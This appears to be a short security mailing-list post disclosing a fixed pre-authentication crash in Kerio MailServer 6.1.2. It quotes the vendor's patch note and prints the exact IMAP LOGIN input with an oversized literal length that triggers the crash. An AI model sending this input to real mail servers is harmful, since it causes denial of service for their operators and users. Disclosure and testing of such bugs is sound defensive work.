Hi,

It should be noted that ProtoVer Sample IMAP testsuite has been released
with 3 unpublished bugs.

Now it looks like that Kerio MailServer preauth bug has been fixed. 

Kerio MailServer 6.1.3 changelog:
"""
Version 6.1.3 Patch 1 - March 9, 2006
- Fixed possible crash when handling special crafted IMAP LOGIN command.
"""

The bug itself is really simple:
$ ls PROTOVER_SAMPLE_IMAP-1.0/audit/
iaemailserver-5.3.4  keriomailserver-6.1.2  merak-8.3.0
$ cat PROTOVER_SAMPLE_IMAP-1.0/audit/keriomailserver-6.1.2
a001 LOGIN {4294967294}
LITERAL TOKEN
a002 LOGOUT
